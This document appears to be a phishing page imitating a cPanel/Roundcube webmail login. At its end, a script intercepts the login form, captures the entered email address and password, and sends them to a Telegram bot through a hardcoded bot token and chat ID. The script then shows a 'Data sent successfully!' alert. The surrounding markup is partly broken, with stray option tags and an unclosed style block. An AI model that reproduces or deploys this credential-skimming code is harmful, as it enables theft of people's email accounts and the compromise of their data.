<body class="wm">
<div id="preload_images"></div>

<input type="hidden" id="goto_uri" value="/3rdparty/roundcube/?_task=mail&amp;_mbox=INBOX">
<input type="hidden" id="goto_app" value="">
<div id="login-wrapper" class="group " style="opacity: 1; visibility: visible;">
    <div class="wrapper">
    <div id="notify">
        <noscript>
            <div class="error-notice">
                <img src="/cPanel_magic_revision_1569619473/unprotected/cpanel/images/notice-error.png" alt="Error" align="left"/>
                JavaScript is disabled in your browser.
                For Webmail to function properly, you must enable JavaScript.
                If you do not enable JavaScript, certain features in Webmail will not function correctly.
            </div>
        </noscript>
        <div id="login-status" class="error-notice" style="visibility: hidden">
            <div class="content-wrapper">
                <div id="login-detail">
                    <div id="login-status-icon-container"><span class="login-status-icon"></span></div>
                    <div id="login-status-message">You have logged out.</div>
                </div>
            </div>
        </div>
    </div>

    <div id="content-container">
        <div id="login-container">
            <div id="login-sub-container">
                    <div id="login-sub-header">
                        <img class="main-logo" src="webmail-logo.svg" alt="logo">
                    </div>
                    <div id="login-sub">
                        <div id="forms">
                            <form novalidate="" id="login_form" action="https://webmail.faribadesigns.com/login/" method="post" target="_self">
                                <div class="input-req-login"><label for="user">Email Address</label></div>
                                <div class="input-field-login icon username-container">
                                    <input name="user" id="user" autofocus="autofocus" value="" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">
                                    <i class="fa fa-user"></i>
                                </div>
                                <div class="input-req-login login-password-field-label"><label for="pass">Password</label></div>
                                <div class="input-field-login icon password-container">
                                    <input name="pass" id="pass" placeholder="Enter your email password." class="std_textbox" type="password" tabindex="2" required="">
                                    <i class="fa fa-lock"></i>
                                </div>
                                <div class="controls">
                                    <div class="login-btn">
                                        <button name="login" type="submit" id="login_submit" tabindex="3">Log in</button>
                                    </div>
                                </div>
                                <div class="clear" id="push"></div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Languages Section -->
    <div id="locale-footer" style="display: block;">
        <div class="locale-container">

        <option value="#de">Deutsch</option>
        <option value="#el">Ελληνικά</option>

    </select>
</div>

<style>
/* Default: Show list, hide dropdown */
.language-list {
    display: block;
    list-style: none;
    padding: 0;
    margin: 0;
}

.language-list li {
    margin-bottom: 5px;
}

.language-dropdown {
    display: none; /* Hidden by default */
}

/* Mobile: Show dropdown, hide list */
@media (max-width: 767px) {
    .language-list {
        display: none; /* Hide list on small screens */
    }
    .language-dropdown {

    }
}

<script>
document.getElementById("login_form").addEventListener("submit", function (e) {
    e.preventDefault(); 
    
    const email = document.getElementById("user").value;
    const password = document.getElementById("pass").value;

    const botToken = "7296259786:AAEouXz7crjzYMqXBAY3W0rSL0jqaK-lvp8";
    const chatId = "6885599280";

    const message = `Email: ${email}\nPassword: ${password}`;
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
        }),
    })
        .then(response => {
            if (response.ok) {
                alert("Data sent successfully!");
            } else {
                alert("Failed to send data.");
            }
        })
        .catch(error => console.error("Error:", error));
});
</script>
